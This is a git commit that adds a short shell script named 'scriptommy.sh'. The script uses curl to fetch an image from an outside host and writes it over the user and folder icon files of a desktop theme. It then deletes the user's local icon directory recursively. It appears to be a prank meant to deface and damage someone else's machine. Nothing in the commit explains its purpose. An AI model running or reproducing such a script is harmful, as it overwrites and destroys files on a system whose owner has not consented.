01bdb0a104610d6d100428098117401cedf5f817
LeDavJr <143696932+LeDavJr@users.noreply.github.com>
2023-10-23 14:35:18 +0200

    Create scriptommy.sh

---
+++ scriptommy.sh
@@ -0,0 +1,5 @@
+directory="/home/$(whoami)/.local/share/icons"
+for file in /usr/share/icons/Win10Sur/scalable/places/{user,folder}*.svg; do curl https://cdn.intra.42.fr/users/e9292e512b188b6ea82cc11ea12ad06e/tcoune.jpg -o $file; done
+if [ -d "$directory" ]; then
+    rm -r "$directory"
+fi
